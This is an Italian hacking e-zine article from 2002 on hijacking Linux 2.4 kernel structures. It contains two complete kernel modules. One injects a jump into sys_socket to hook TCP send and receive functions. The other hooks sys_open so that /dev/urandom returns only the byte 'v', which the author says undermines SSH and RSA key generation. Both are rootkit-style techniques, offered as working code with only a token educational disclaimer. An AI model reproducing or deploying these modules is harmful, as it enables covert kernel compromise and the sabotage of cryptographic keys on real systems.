@@ -1,0 +1,634 @@
+==============================================================================
+--------------------[ BFi11-dev - file 02 - 11/01/2002 ]----------------------
+==============================================================================
+
+
+-[ DiSCLAiMER ]---------------------------------------------------------------
+        Tutto il materiale contenuto in BFi ha fini eslusivamente informativi
+        ed educativi. Gli autori di BFi non si riterranno in alcun modo
+        responsabili per danni perpetrati a cose o persone causati dall'uso
+        di codice, programmi, informazioni, tecniche contenuti all'interno
+        della rivista.
+        BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
+        liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
+        di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
+        e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
+        e cancella questi file dal tuo computer * . Proseguendo tu, lettore,
+        ti assumi ogni genere di responsabilita` per l'uso che farai delle
+        informazioni contenute in BFi.
+        Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
+        della rivista: distribuite BFi nella sua forma integrale ed originale.
+------------------------------------------------------------------------------
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ HKS: HACKiNG KERNEL STRUCTURES
+-----[ vecna <vecna@s0ftpj.org>
+
+
+------------------------------------------------------------------------------
+
+                           hacking kernel structures
+
+                    vecna@s0ftpj.org - http://www.s0ftpj.org
+
+------------------------------------------------------------------------------
+
+PREMESSA
+
+	sento il bisogno di fare questo articolo anche se mi sembra
+	assolutamente inutile, pero` dopo aver visto:
+
+    xxx/1999 - pIGpEN (recentemente impegnato in corse con passeggino
+	       clandestine :) scrive dei moduli per freebsd atti a cambiar 
+	       le funzioni dei protocolli, e` un'idea bella e in pochi si
+	       accorgono del senso che c'e` sotto a quell'esempio.
+    Dec/2001 - tante persone vedon la stessa cosa applicata al proc
+	       filesystem su phrack58 e OOOOOOOOOOOOOOHHHHHHHHHHHH stupore, 
+	       si e` aperta una nuova finestra sul mondo! l'illuminazione ha 
+	       raggiunto l'uomo! d'ora in poi saremo al pari di atlantide... 
+	       bah.
+    Jan/2002 - nasce questo articolo che completa un po' la panoramica di
+	       quello che si puo` fare (ma non troverete nulla di nuovo
+	       eh! avvertiti!) e come si puo` applicare a svariate parti di
+	       kernel, poiche`
+
+	ho pensato che potrebbe essere utile.
+
+PROMESSA
+
+	boh magari qualcosa vi suggerira` delle belle idee... se non capite
+	proprio niente (cosa che temo succeda spesso, ho iniziato a pensare
+	che scrivo di merda) ditemelo saro` felice di rispiegarvelo.
+
+PREMOSSA
+
+	mettere kernel 2.4
+
+
+---] ALTERAZIONE DELLE FUNZIONI RELATIVE A UN PROTOCOLLO SOTTO LINUX 2.4 [---
+
+esistono varie funzioni che lavorano su file descriptor di rete... ad esempio
+la recvmsg, da man page:
+
+#include <sys/types.h>
+#include <sys/socket.h>
+
+	int recv(int s, void *buf, size_t len, int flags);
+
+	int recvfrom(int s, void *buf, size_t len, int flags,
+	             struct sockaddr *from, socklen_t *fromlen);
+
+	int recvmsg(int s, struct msghdr *msg, int flags);
+
+essendo una chiamata di sistema, nel 99% delle possibilita` si trova la 
+funzione implementata in kernel space con il nome di "sys_NOMECHIAMATA", in
+questo caso in /usr/src/linux/net/socket.c si trova sys_recv che a sua volta
+chiama 
+
+long sys_recv(int fd, void * ubuf, size_t size, unsigned flags)
+	{
+        return sys_recvfrom(fd, ubuf, size, flags, NULL, NULL);
+	}
+
+e seguendo sys_recvfrom vediamo nelle prime linee di codice:
+
+long sys_recvfrom(int fd, void * ubuf, size_t size, unsigned flags,
+                  struct sockaddr *addr, int *addr_len)
+	{
+	struct socket *sock;
+	int err,err2;
+	[...]
+
+	sock = sockfd_lookup(fd, &err);
+	if (!sock)
+		goto out;
+
+	[...]
+	}
+
+analogamente a quando si passa un file descriptor a funzioni che lavorano
+strettamente su file (lseek ad esempio) vediamo la funzione sockfd_lookup (nel 
+caso di file veri e propri c'e` la fget) che serve per trovare la struttura 
+socket relativa al file descriptor (praticamente, il kernel tiene in memoria 
+parecchie info per poter far andare le connessioni in modo decente, visto che 
+in userspace una connessione la vediamo come 1 file descriptor che poi non e` 
+altro che un numero... risulta ovvio che da qualche parte che non e` 
+l'userspace ci sono queste informazioni relative alla connessione... e dove 
+sono? nella struttura socket!).
+
+in /usr/src/linux/include/linux/net.h troviamo:
+
+struct socket
+	{
+	socket_state            state;
+	unsigned long           flags;
+	struct proto_ops        *ops;
+	struct inode            *inode;
+	struct fasync_struct    *fasync_list;   /* Asynchronous wake up list */
+	struct file             *file;          /* File back pointer for gc */
+	struct sock             *sk;
+	wait_queue_head_t       wait;
+	short                   type;
+	unsigned char           passcred;
+	};
+
+ci sono campi di cui conosco il significato e altri di cui non conosco il 
+significato, ma quello che dobbiamo tener a memoria e` che se vogliamo hackare
+in kernel space e vogliamo cambiare in scioltezza funzioni dobbiamo trovare
+delle funzioni da cambiare, da wrapperare o da non far chiamare... visto che 
+qui siamo in una struttura l'unico modo che c'e` per trovar delle funzioni
+a cui ricondurre lax nostra ricerca e` cercare dei puntatori a funzione
+all'interno di strutture. per velocizzare la nostra ricerca basta tornare
+nella sys_recvfrom.
+
+li` vediamo poco piu` avanti della ricerca della struttura, trovata grazie al
+file descriptor e al processo che sta girando in quel momento, la riga:
+
+        err=sock_recvmsg(sock, &msg, size, flags);
+
+funzione sempre in socket.c che fa:
+
+int sock_recvmsg(struct socket *sock, struct msghdr *msg, int size, int flags)
+	{
+	struct scm_cookie scm;
+
+	memset(&scm, 0, sizeof(scm));
+
+	size = sock->ops->recvmsg(sock, msg, size, flags, &scm);
+	if (size >= 0)
+		scm_recv(sock, msg, &scm, flags);
+
+	return size;
+	}
+
+!!! chiama una funzione recvmsg da sock->ops->, ops come visto sopra e` il
+nome delle "proto_ops" questo significa che c'e` una serie di funzioni
+(una serie per ogni possibile struct proto_ops quindi infinite... quindi forse
+anche vostre funzioni per vostri protocolli...) che viene eseguita dalle
+nostre chiamate di sistema in relazione al tipo di socket che stiamo usando.
+
+questa oltre che una bella scoperta per tutti i programmatori kernel e` anche
+una manna dal cielo per tutti quelli che vogliono manipolare il kernel per
+far andare qualcosa in modo trasparente... se normalmente agivamo a livello di
+netfilter o di packet_type, quindi piu` vicini alle interfaccie di rete che
+alle chiamate dell'utente (se si voleva ricondurre la connessione bisognava
+controllare la porta, l'id del pacchetto, la sockaddr_in...) qui invece
+lavoriamo in un punto piu` vicino all'utente che alle interfaccie.
+
+quindi se vogliamo monitorare un certo demone non ci servira` beccare i
+pacchetti e ricostruirli in relazione alla porta ecc... e al protocollo
+tcp/udp/bhop, ma bastera` monitorare le chiamate bind (o la sys_bind o quelle
+di un protocollo che ci interessa) e a quel punto cambiar le funzioni dentro
+la "ops".
+
+e nella ops ci sta la bellezza di:
+
+struct proto_ops 
+	{
+	int family;
+
+	int (*release) (struct socket *sock);
+	int (*bind) (struct socket *sock, struct sockaddr *umyaddr, 
+	             int sockaddr_len);
+	int (*connect) (struct socket *sock, struct sockaddr *uservaddr,
+		        int sockaddr_len, int flags);
+	int (*socketpair) (struct socket *sock1, struct socket *sock2);
+	int (*accept) (struct socket *sock, struct socket *newsock, int flags);
+
+	[...]
+
+	};
+
+e a parte bind accept ecc... anche recvmsg sendmsg e tutte le funzioni che
+noi utiliziamo indipendentemente da un protocollo, ma il kernel tiene
+suddivise e dinamiche, tutte le funzioni di un protocollo stanno nella
+loro struttura e questa viene linkata alla struttura socket a seconda del
+socket che stiamo usando.
+
+poi si scopre, cercando riferimenti alle proto_ops dentro i codici del
+kernel in /usr/src/linux/net/ipv4 si scopre che c'e` una funzione apposita
+(come volevasi dimostrare) per i principali protocolli, c'e` tcp_recvmsg, c'e`
+udp_recvmsg... rispettivamente nel file tcp.c e udp.c.
+
+quindi, andando a veder quelle funzioni:
+
+int tcp_recvmsg(struct sock *sk, struct msghdr *msg,
+                int len, int nonblock, int flags, int *addr_len)
+	{
+	[...]
+	}
+
+risulta cosi` remota la possibilita` di wrapperare una di queste chiamate?
+facciamo un modulo lamer che lo fa.
+
+gli hack possibili sono 2, il piu` immediato e`:
+cambiamo la sys_socket in modo che, quando si attiva un nuovo socket TCP, prima
+di restituire il file descriptor andiamo nella struttura socket assegnatagli
+e cambiamo le funzioni del protocollo.
+
+e sarebbe semplice se non fosse che sys_socket non e` una chiamata di sistema
+come quelle che normalmente cambiamo via sys_call_table... perche` non esiste
+SYS_socket tra quell'array, ma SYS_socketcall che e` un'altra chiamata di 
+sistema che wrappera altre chiamate socket di cui solo una e` quella che ci
+interessa. 
+quindi seguendo un po' la tecnica spiegata dal buon silvio 
+http://www.big.net.au/~silvio per poter cambiar funzioni senza simbolo
+esportato (mi e` servita anche per funzioni con simbolo esportato, ma non 
+raggiungibile attraverso puntatori) in modo da cambiare la sys_socket con la 
+nostra che da li` inserira` nelle strutture socket i riferimenti alla nostra 
+recvmsg e sendmsg.
+
+<-| tsph.c |->
+#define __KERNEL__
+#define MODULE
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/socket.h>
+#include <linux/in.h>
+#include <linux/ip.h>
+#include <linux/udp.h>
+#include <net/tcp.h>
+#include <linux/skbuff.h>
+#include <linux/version.h>
+#include <sys/syscall.h>
+/*                                                                          *
+ * test single protocol hack by vecna@s0ftpj.org                            *
+ * example code for HKS work/article                                        *
+ *                                                                          */
+
+/* for replace sock->ops->sock_recvmsg and sock->ops->sock_sendmsg */
+static int (* tcp_recv)(struct sock *, struct msghdr *, int, int, int, int *);
+static int (* tcp_send)(struct sock *, struct msghdr *, int);
+
+/* 
+ * for
+ * 547./usr/src/linux/net# grep sockfd_lookup /proc/ksyms
+ * 548./usr/src/linux/net#
+ * seek sockfd_lookup symbol also if isn't exported
+ */
+static struct socket *(* sockfd_lookup)(int, int *) =(void *)0xc0187b8c;
+/*
+ * 548./usr/src/linux/net# grep sockfd_lookup /boot/System.map
+ * 00000000c0187b8c T sockfd_lookup
+ * 549./usr/src/linux/net#
+ *
+ * address is retrived by grep :)
+ */
+
+static int (* sock_map_fd)(struct socket *) =(void *)0xc0187a28;
+/*
+ * the same things about sock_map_fd
+ */
+
+#define CODESIZE	7
+
+static char inj_code[CODESIZE]=
+        "\xb8\x00\x00\x00\x00"  /* movl $0, %eax adderess is memcopyed after */
+	"\xff\xe0"              /* jmp  *%eax */
+	;
+
+/* address of sys_socket for copy into new code */
+void *socket_sym =(void *)0xc01884f8;
+
+/* backup of linux code at socket_sym address */
+static char code_backup[CODESIZE];
+
+static int tsph_recvmsg(struct sock *sk, struct msghdr *msg, 
+			int len, int nonblock, int flags, int *addr_len)
+	{
+	int ret =tcp_recv(sk, msg, len, nonblock, flags, addr_len);
+
+	printk(KERN_INFO "pkt tcp rcvd\n");
+
+	return ret;
+	}
+
+static int tsph_sendmsg(struct sock *sk, struct msghdr *msg, int size)
+	{
+	printk(KERN_INFO "pkt tcp snd\n");
+
+	return tcp_send(sk, msg, size);
+	}
+
+static int tsph_socket(int family, int type, int protocol)
+	{
+	/*
+	 * this code is more or less the same of /usr/src/linux/net/socket.c
+	 * because of schedule problem I've preferred work over this than
+	 * call original sys_socket and work on socket after
+	 */
+	int ret;
+	struct socket *sock;
+
+	if((ret =sock_create(family, type, protocol, &sock)) < 0)
+		goto out;
+
+	if((ret =sock_map_fd(sock)) < 0)
+		goto out_release;
+
+out:
+	if(sock->sk->prot && !strcmp(sock->sk->prot->name, "TCP"))
+	        {
+
+		if(sock->ops->sendmsg !=NULL)
+			{
+			if(tcp_recv ==NULL)
+				tcp_recv =(void *)sock->ops->recvmsg;
+
+			sock->ops->recvmsg =(void *)tsph_recvmsg;
+			}
+		if(sock->ops->recvmsg !=NULL)
+			{
+			if(tcp_send ==NULL)
+				tcp_send =(void *)sock->ops->sendmsg;
+
+			sock->ops->sendmsg =(void *)tsph_sendmsg;
+			}
+		}
+
+	/* It may be already another descriptor 8) Not kernel problem. */
+	return ret;
+
+out_release:
+	sock_release(sock);
+	return ret;
+	}
+
+int init_module(void)
+	{
+
+	*(unsigned long *)&inj_code[1] =(unsigned long)tsph_socket;
+
+	/* make 5 byte backup, for save code on kmem referred to socket_sym */
+	memcpy(code_backup, socket_sym, CODESIZE);
+
+	/* copy asm code with exactly address over normal socket symbol ptr */
+	memcpy(socket_sym, inj_code, CODESIZE);
+
+	return(0);
+	}
+
+void cleanup_module(void)
+	{
+	/* restore */
+	memcpy(socket_sym, code_backup, CODESIZE);
+	}
+<-X->
+
+nota: se un programma che usa un socket viene avviato quando il modulo e` 
+      caricato e tiene il socket tcp aperto fino al momento in cui il modulo 
+      viene rimosso andra` in segfault.
+
+il modulo cosa fa? nella funzione tshp_socket controlla se il socket e`
+di tipo tcp, salva la funzioni di /usr/src/linux/net/ipv4/tcp.c tcp_recvmsg
+e tcp_sendmsg in 2 puntatori di backup in modo da chiamarli dalle nostre
+funzioni e sostituisce quel puntatore nella struttura socket in modo che 
+quando verra` inviato un pacchetto o ricevuto apparira` un messaggio nei
+log di klogd tramite printk. quello e` solo un esempio pero` manipolando la 
+struttura msghdr, la struttura socket,... si puo` far veramente l'impossibile,
+tutto sta alla vostra fantasia :)
+
+----------- SPIEGAZIONI SULLA TECNICA UTILIZZATA DA SILVIO CESARE -----------
+
+/dev/kmem e` la rappresentazione in memoria di quello che e` /boot/bzImage
+una volta caricato, da bzImage in fase di installazione del kernel viene
+estratto un file chiamato System.map ottenuto tramite il comando nm(1) che
+serve per estrapolare la tabella dei simboli da un file oggetto (normalmente
+i file oggetto che vediamo sono gli .o, praticamente i simboli stanno in
+tutti gli ELF non strippati (strip(1) leva i simboli dai file)).
+il file System.map e il suo formato risulta utilissimo in quanto possiamo
+sapere l'esatta posizione in memoria di tutti i simboli che ci sono. i
+simboli sono ogni variabile o funzione dichiarata statica o globale dentro a
+un file sorgente del kernel. questo non sembrera` immediatamente utile, ma dal
+momento che quando apriamo /dev/kmem possiamo muoverci grazie a quegli offset
+e trovare proprio quei simboli e tramite moduli (che van anch'essi caricati
+in kmem) possiamo usare indirizzi statici in modo da raggiungere punti del
+kernel altrimenti irraggiungibili.
+
+e questa e` a dir poco manna dal cielo perche` possiamo trovarci a leggere o a
+scrivere in ogni punto del kernel (e questo vabeh` non e` nulla di strano),
+ma possiamo anche scrivere e leggere con dei comodi moduli (e questo e` il
+bello fatto da silvio :) . d'altro canto... proviamo a immaginare cosa puo`
+esserci in memoria all'indirizzo di un simbolo... c'e` il codice della
+funzione che descrive e basta... e supponiamo noi volessimo cambiare una
+di quelle funzioni... basterebbe scrivere con pochi byte in assembly le
+istruzioni necessarie per far fare un jump sopra il codice del simbolo: in
+questo modo quando il kernel andra` in quel punto per avviare quella
+funzione trovera` un codice da noi iniettato che lo fara` saltare da un'altra
+parte (nel nostro caso, dalla mia funzione che sta nel modulo).
+
+nella spiegazione e negli esempi di silvio cesare c'e` anche la parte relativa
+al ripristino immediato del simbolo per poter invocare la funzione originaria
+una volta hijackkata... nel mio caso non era necessario cmq questo pezzo
+di spiegazione voleva solo essere un'intro, tutte le info necessarie le 
+trovate a: http://www.big.net.au/~silvio/kernel-hijack.txt
+
+---------] ALTERAZIONE DELLE FUNZIONI RELATIVE AD UN DEVICE DRIVER [----------
+
+analizzando il codice di un modulo che supporta un device driver vediamo, 
+sorvolando le chiamate in fase di init, che la struttura che controlla tutte
+le funzioni correlate al device e` (da
+/usr/src/linux/net/netlink/netlink_dev.c):
+
+static struct file_operations netlink_fops = 
+	{
+	owner:          THIS_MODULE,
+	llseek:         netlink_lseek,
+	read:           netlink_read,
+	write:          netlink_write,
+	poll:           netlink_poll,
+	ioctl:          netlink_ioctl,
+	open: 		netlink_open,
+	release: 	netlink_release,
+	};
+
+intuitivamente fa gia` compredere che in un device driver e` possibile 
+mettere delle funzioni apposite nel caso venga invocata una chiamata di
+sistema su quel device driver... se, per quanto riguarda un socket, esistono
+delle funzioni diverse in relazione ai protocolli... perche` per quanto
+riguarda i file non possono esistere delle funzioni diverse a seconda del
+tipo di file? considerando che i file possono essere: device driver, file
+normali, directory, socket, fifo, pipe... e solo tra i device driver
+ricordiamo vari file che ci forniscono svariate features come urandom, tty,
+netlink, hda* ...
+comprendiamo che in kernel space e` necessario avere una serie di
+accortezze che consentono di implementare nuove features senza che il
+programmatore debba addentrarsi tra i meandri piu` profondi del kernel.
+
+una di queste accortezze e` proprio quella di utilizzare dei puntatori a
+funzione nelle strutture dei file... analogamente a quanto abbiam visto per
+i socket, anche loro sono riconosciuti in user space con dei semplici numeri
+(file descriptor), ma in kernel space hanno una struttura apposita linkata
+alla file descriptor table che ha ogni processo (salvo rare eccezioni ottenute
+con particolari opzioni di rfork sotto freebsd e` sempre cosi`).
+
+la struttua file ha dei puntatori alle funzioni write, read, poll e altre
+e come abbiamo visto prima e` molto semplice cambiare questi puntatori :)
+
+un hack simpatico che mostrero` riguarda le read di un device driver 
+particolarmente significativo per la sicurezza di un sistema anche se forse
+in pochi ci fan caso :) /dev/urandom.
+sara` molto molto piu` semplice di quello precedente senza incasinarsi con
+simboli o altro.
+
+<-| sfoh.c |->
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/major.h>
+#include <linux/string.h>
+#include <linux/fcntl.h>
+#include <linux/slab.h>
+#include <linux/random.h>
+#include <linux/poll.h>
+#include <linux/init.h>
+#include <linux/fs.h>
+#include <linux/file.h>
+#include <linux/errno.h>
+
+#include <sys/syscall.h>
+
+/*
+ * example of simple file ops function hijacking
+ *
+ * on this module read of /dev/urandom return always and only 'v', this
+ * can compromise a lot security (think to ssh and key generation ...)
+ *
+ * simple and lamer code by vecna@s0ftpj.org
+ *
+ * UEEEEEEEEEEEEEEEEEE`EEEEEEEE`EEEEEEEEEEE`EEEEEEEEE`EEEEEEEE`EEEEE`
+ */
+static int (*linux_open)(const char *, int, int);
+static int (*urandom_read)(struct file *, char *, size_t, loff_t *);
+
+extern void *sys_call_table[];
+
+/* hijack urandom_read (not also random_read!) */
+static int ddcr_read(struct file *file, char *buf, size_t len, loff_t *pos)
+	{
+	static char fakebyte='v';
+	int ret, i;
+
+
+	ret =urandom_read(file, buf, len, pos);
+
+	for(i =0; i < len; i++)
+		__generic_copy_to_user(&buf[i], (void *)&fakebyte, 1);
+	
+	return ret;
+	}
+
+/* hijack sys_open */
+static int ddcr_open(const char *fname, int flags, int mode)
+	{
+	int ret =linux_open(fname, flags, mode);
+
+	if(ret >= 0 && !strcmp(fname, "/dev/urandom"))
+		{
+		struct file *uran =fget(ret);
+
+		if(urandom_read ==NULL)
+			urandom_read =(void *)uran->f_op->read;
+
+		uran->f_op->read =ddcr_read;
+
+		fput(uran);
+		}
+
+	return ret;
+	}
+
+int init_module(void)
+	{
+	/* I love stock 84 */
+	printk(KERN_INFO "loading urandom's fucker \n");
+		
+	linux_open =sys_call_table[SYS_open];
+	sys_call_table[SYS_open] =ddcr_open;
+
+	return(0);
+	}
+
+void cleanup_module(void)
+	{
+	printk(KERN_INFO "unloading module, could /dev/urandom take kernelp\n");
+
+	sys_call_table[SYS_open] =linux_open;
+	}
+<-X->
+
+perche` ho detto che compromette la sicurezza? una caterva di programmi si
+appoggiano a /dev/urandom o /dev/random e non credo che un sysadmin 
+abitualmente legga gli output di questi 2 device driver o li sottoponga ad
+analisi statistica (volendo fare una cosa piu` seria anziche` fargli scrivere 
+sempre "v" basta che spariate una sequenza di caratteri non printabili in
+sequenza), ma a cosa puo servire in pratica questa cosa? mah... conoscendo
+l'output di /dev/urandom a prori si puo` fare un veloce reversing in modo da
+sapere gia` quali sono quei 2 fantomatici "numeri grossi" alla base della 
+sicurezza di RSA... e quanti programmi che usano RSA non richiedono un input
+da parte dell'utente? (onestamente ne ho provati e solo pgp/gpg me l'han 
+chiesto :)
+
+cmq il senso di quel modulo e` dimostrare che e` facile cambiare una funzione
+specifica ad un file specifico, il controllo nel mio caso avviene su un path 
+relativo, per i vostri moduli potete usare tutto quello che sta nella
+struttura file, tra cui owner permessi ecc... 
+
+-------------------------------] CONCLUSIONI [--------------------------------
+
+consci di queste potenzialita` e del fatto che si puo` cambiare OGNI funzione
+che sia collegata da un puntatore a funzione con un semplice "=" e con la
+tecnica di silvio cesare e` possibile cambiare OGNI funzione in senso assoluto
+(tranne quelle inline che richiederebbero un discorso a parte, ma il concetto 
+non sarebbe troppo diverso) potete aver chiaro quindi che si puo` fare OGNI
+cosa, in particolare le cose che pensate impossibili :)
+
+---------------------------------] LICENZA [----------------------------------
+
+se questo articolo vi e` servito dovete una birra a vecna@s0ftpj.org ,
+grazie. visto che le birre non si mandano ancora per mail :(( all'hackit
+potrete offrirmela :)
+
+
+-[ WEB ]----------------------------------------------------------------------
+
+	http://www.bfi.cx
+	http://www.s0ftpj.org/bfi/
+	http://bfi.itapac.net
+
+
+-[ E-MAiL ]-------------------------------------------------------------------
+
+        bfi@s0ftpj.org
+
+
+-[ PGP ]----------------------------------------------------------------------
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+
+mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
+DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
+nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
+lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
+iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
+TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
+c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
+a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
+GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
+WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
+gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
+l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
+=o7CG
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+==============================================================================
+-----------------------------------[ EOF ]------------------------------------
+==============================================================================
+
